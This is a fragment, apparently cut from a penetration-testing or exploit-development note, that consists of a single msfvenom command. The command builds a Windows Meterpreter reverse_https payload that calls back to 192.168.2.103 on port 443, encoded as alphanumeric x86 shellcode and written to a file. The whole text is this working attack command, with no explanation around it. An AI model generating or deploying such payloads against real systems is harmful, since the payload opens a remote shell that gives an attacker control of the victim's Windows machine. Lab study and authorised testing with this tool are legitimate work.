...
msfvenom -p windows/meterpreter/reverse_https lhost=192.168.2.103 lport=443 -e x86/alpha_mixed BufferRegister=EAX -a x86 --platform Windows -f raw > alpha_mixed.txt
